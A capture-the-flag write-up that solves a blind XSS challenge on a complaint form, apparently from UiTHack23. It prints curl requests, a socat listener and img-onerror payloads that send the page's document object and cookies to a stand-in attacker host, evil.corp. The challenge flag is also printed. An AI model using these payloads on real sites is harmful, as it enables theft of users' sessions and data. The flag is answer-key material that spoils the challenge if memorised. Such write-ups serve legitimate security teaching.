# Flags 24/7

Bill gates approves this design

motherload.td.org.uit.no:5050

# Writeup

Looking at the website I found nothing at a first glance. There is a post which runs a request when pressing the get flag. I'll look more into that if it's not a read herring.

```
curl 'http://motherload.td.org.uit.no:5000/complaint' \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"test","complaint":"test"}'
```

I sent a few requests but nothing seems to work. So I tried to see if someone was reading those complaints via HTML by sending exactly that, HTML data. Sending the following request while hosting a simple `socat` server using `socat - TCP-LISTEN:1234,fork,reuseaddr`. 

```
curl 'http://motherload.td.org.uit.no:5000/complaint' \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"<img src='http://evil.corp:1234/email.png'>","complaint":"<img src='http://evil.corp:1234/complaint.png'>"}'
```

Seems to do nothing. So I'll looking at other things in the DOM. I found nothing really exploitable. Everything is local. The  logo is kinda weird it has a weird hash in it:

```
http://motherload.td.org.uit.no:5050/static/media/logoHeader.a2e1f8a09e95fdffdafd.png
```

Seems like nothing, crackstation did not have this hash, neither did google. But it is in the flags 24/7. Woah, there I got something in my socat session!

```bash
ubuntu@vm23152:~$ socat - TCP-LISTEN:1234,fork,reuseaddr
Listening on 0.0.0.0 1234
Connection received on 129.242.219.77 35664
GET /complaint.png HTTP/1.1
Host: evil.corp:1234
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/109.0.5414.74 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://motherload.td.org.uit.no:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Wow, someone actually reads the complaints?  Seems like the complaint field is XSS'able. We're actually dealing with `Blind XSS`. This is when you can kinda add a ticking bomb to the system. You dont know when it is executed but once it does it will be run on the victims machine. So you need to keep your server up to receive the data. Seems like it runs every minute so I'll have to wait one minute for each test.

So I try to see if I can get RCE by getting the document object.

```json
{
	"email": "",
	"complaint": "<script>document.location= 'http://evil.corp:1234/?' + JSON.stringify(document)</script>"
}
```

Not really getting anything. Might be that script is filtered. Opening the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#dom-based-xss) reminded me of the onerror in image which ofcourse also executes scripts.

```json
{
	"email": "",
	"complaint": "<img src=/ onerror='this.src=\"http://evil.corp:1234/test.png\"'>"
}
```

Oh this worked, lets see if I can get document.cookie:


```json
{
	"email": "",
	"complaint": "<img src=/ onerror='this.src=\"http://evil.corp:1234/test.png?\" + JSON.stringify(document)'>"
}
```

And there we go we got the whole document object: 

```
GET /test.png?{%22location%22:{%22ancestorOrigins%22:{},%22href%22:%22http://motherload.td.org.uit.no:5000/admin?sha256=<REDACTED>%22,%22origin%22:%22http://motherload.td.org.uit.no:5000%22,%22protocol%22:%22http:%22,%22host%22:%22motherload.td.org.uit.no:5000%22,%22hostname%22:%22motherload.td.org.uit.no%22,%22port%22:%225000%22,%22pathname%22:%22/admin%22,%22search%22:%22?sha256=<REDACTED>%22,%22hash%22:%22%22}} HTTP/1.1
Host: evil.corp:1234
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/109.0.5414.74 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://motherload.td.org.uit.no:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```

Some quick urlencoding, and prettifying:

```json
{
  "location": {
    "ancestorOrigins": {},
    "href": "http://motherload.td.org.uit.no:5000/admin?sha256=<REDACTED>",
    "origin": "http://motherload.td.org.uit.no:5000",
    "protocol": "http:",
    "host": "motherload.td.org.uit.no:5000",
    "hostname": "motherload.td.org.uit.no",
    "port": "5000",
    "pathname": "/admin",
    "search": "?sha256=<REDACTED>",
    "hash": ""
  }
}
```

I think I'm breaking something I was not supposed to break here. But `motherload.td.org.uit.no:5000` is an external server running the `admin` endpoint. It gives a error `901 NO FLAG HERE`. But adding that redacted sha256 to the url request I get `test`. There is also a script loaded in there which looks like this:

```js
fetch(
  "http://motherload.td.org.uit.no:5000/db?sha256=<REDACTED>"
)
  .then((response) => {
    return response.json();
  })
  .then((data) => {
    displayCocktail(data);
  })
  .catch((error) => console.error("FETCH ERROR:", error));

function displayCocktail(data) {
  document.cookie = "flag=UiTHack23{xxspl0its_4r3_phun}";
  const cocktailDiv = document.getElementById("cocktail");
  try {
    data.forEach((issue) => {
      const cocktailName = document.createElement("div");
      cocktailName.innerHTML = issue[1];
      cocktailDiv.appendChild(cocktailName);
    });
  } catch (e) {}
}

phantom.exit();
```

Here I can see the flag. I also see that the endpoint `db` is showing our complaints once, then deletes them. So I could break it here by curling this endpoint ever 5 seconds and steal all your complaints. `*evil-laughter*`.  The meaning is that we are blind xss'ing the document.cookie as I read it. But I think I went a step further.

The intended solution seems to be:

```json
{
	"email": "",
	"complaint": "<img src=/ onerror='this.src=\"http://evil.corp:1234/test.png?\" + document.cookie'>"
}
```

Which gives the flag in the request.

# Flag

```
UiTHack23{xxspl0its_4r3_phun}
```

